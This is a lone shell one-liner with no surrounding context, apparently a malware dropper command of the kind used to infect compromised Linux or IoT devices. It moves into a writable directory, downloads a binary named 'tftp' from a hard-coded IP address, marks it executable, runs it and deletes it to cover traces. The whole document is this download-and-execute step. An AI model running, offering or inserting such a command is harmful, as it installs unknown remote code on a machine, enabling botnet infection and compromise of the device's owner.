cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.55.16.166/tftp; chmod +x tftp; ./tftp; rm -rf tftp
